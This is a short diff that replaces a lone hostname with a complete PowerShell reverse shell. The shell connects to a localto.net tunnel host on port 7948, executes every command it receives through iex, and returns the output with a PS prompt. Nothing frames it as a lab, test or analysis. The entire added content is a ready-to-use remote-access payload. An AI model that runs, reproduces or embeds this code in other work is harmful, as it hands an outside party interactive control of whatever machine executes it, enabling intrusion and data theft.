@@ -1,1 +1,14 @@
-pgooi7m0fr.localto.net
+$LHOST = "pgooi7m0fr.localto.net"
+$LPORT = 7948
+$c = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT);
+$s = $c.GetStream();
+[byte[]]$b = 0..65535|%{0};
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+    $sb = (iex $d 2>&1 | Out-String );
+    $sb2  = $sb + "PS " + (pwd).Path + "> ";
+    [byte[]]$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);
+    $s.Write($sendbyte,0,$sendbyte.Length);
+    $s.Flush()
+};
+$c.Close()
